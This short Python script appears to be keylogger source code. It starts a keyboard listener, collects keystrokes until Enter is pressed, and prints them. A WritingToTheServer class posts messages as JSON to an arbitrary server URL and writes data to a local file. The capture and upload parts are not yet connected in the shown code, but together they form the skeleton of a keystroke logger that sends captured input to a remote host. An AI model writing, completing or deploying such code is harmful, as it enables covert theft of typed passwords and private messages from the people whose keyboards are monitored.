import requests
from Keyboard import KeyBoard

class WritingToTheServer:

    def __init__(self, server_url):
        self.server_url = server_url


    def create_file(self,d,s = "n.txt"):
        with open(s, 'w', encoding='utf-8') as file:
            file.write(d)
        print("secseful")

    def send_log(self, message):
        data = {"message": message}
        headers = {"Content-Type": "application/json"}
        response = requests.post(self.server_url, json=data,headers=headers)
        print(response.json())

keyBord = KeyBoard()
keyBord.start_listening()

input("Press Enter to stop listening...\n")
keyBord.stop_listening()

print(keyBord.get_listen_keys())